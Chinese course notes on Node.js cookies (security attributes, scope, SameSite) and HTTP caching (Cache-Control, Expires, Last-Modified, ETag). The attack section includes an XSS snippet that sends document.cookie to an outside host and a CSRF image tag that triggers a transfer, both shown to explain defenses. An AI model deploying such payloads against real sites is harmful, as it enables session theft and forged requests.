# Node缓存、安全与鉴权

## 1. 课程目标
1. node缓存使用 & cookie
2. 常见的鉴权方法

## 2. cookie

cookie作用：
1. 会话状态的管理
2. 个性化设置（主题、自定义）
3. 浏览器行为跟踪 trace、cid

webStorage indexDB
cookie: 存储数据 samesite

```js
set-cookie: cookie名称 cookie值
```

### cookie生命周期
- 会话期Cookie: 随着浏览器的关闭，会删除掉cookie,expires max-age
- 持久性Cookie: expires max-age

### 安全性设置

secure: 只有HTTPS才能携带cookie
httpOnly: 只有服务端才能下发cookie, 本地JS无法操作cookie

document.cookie

### cookie 作用域
domain: origin, 不包含子域名的
path：path=/a path=/a/b path=/a/b/c

### samesite

Set-Cookie:k=v;samesite=XXX

1. none: xianzao.com/a xinazao.com/b none 都是可以获取到cookie
2. strict: 浏览器只有在访问相同站点才会发送cookie
3. lax: 与strict相似，从外部跳转导航至url, 会带有cookie，其他不行

### JS操作cookie

```js
document.cookie = 'user=xianzao'
document.cookie = 'cookie=apple'

console.log(document.cookie)
user=xianzao;cookie=apple
```

### 攻击
- secure
- httpOnly
- samesite

XSS攻击
```js
 (new Image()).src=`http://xianzao.com?cookie=${document.cookie}`
```

httpOnly

CSRF攻击

```js
<img src="http://xianzao.com?account=xianzao&amount=10000">
```
打开的页面含有这个图片

- samesite: strict - 只要不是当前页面都不能过来
- 敏感信息操作都需要认证
- Cookie 设置周期较短， 1min

## 缓存

### 缓存的作用
1. 减少数据请求，节省带宽
2. 加快页面加载速度，提高页面加载效率
3. 减少服务端的压力

### 让你去设置缓存，如何设置

1. 强制缓存
客户端       缓存库         服务器
  1. 请求数据，如果有缓存，直接返回结果
  2. 请求数据，没有缓存，去服务端去调用
  3. 返回数据和缓存规则，将数据放到缓存系统

- expires: http1.0 Date.now()
- cache-control http1.1

为什么又expires还要设置cache-control?
 - 本地的时间是可以设置的，可能导致cookie提前或者稍后失效

 cache-control
 资源有效的最大有效时间，在这段时间里，客户端不会向服务端发请求
 优先级是大于expires

 ```js
  Cache-Control: max-age=20 // 有效期是20s
  // 属性
  1. no-cache：不适用强制缓存，可以使用协商缓存，不是不缓存
  2. no-store：禁止使用任何类型的缓存
  3. public: 任何路径下的缓存者（客户端的本地缓存、proxy代理服务器）无条件地缓存，默认值
  4. private：指定用户或者实体（用户群体）缓存资源
 ```
 优先级 4213
```js
res.setHeader('Cache-Control': 'no-store')
res.setHeader('Cache-Control': 'max-age=20')
```
2. 协商缓存（对比缓存）

- last-modified: 资源最后的修改时间

```js
Last-modified: time
```
1. 服务端在response header中返回last-modified
2. 客户端在浏览器中记录last-modified
3. 下次请求时，浏览器在request header中带上， if-modified-since请求服务器
4. if-modified-since last-modified对比，如果相等直接返回状态码304，如果不相等返回200，返回数据

缺点：
1. 修改时间1s, 1s内更新多次，last-modified
2. 如果文件是服务端动态生成，更新时间就是生成时间，就算内容没有变化，文件每次都要重新获取

- Etag

基于文件设置的唯一的值，文件内容不变， Etag值不变

if-none-match

缺点：
1. 每次请求的时候，都要读取文件，判断有没有修改
2. 如果是大文件，文件的大小+最后修改时间组合成Etag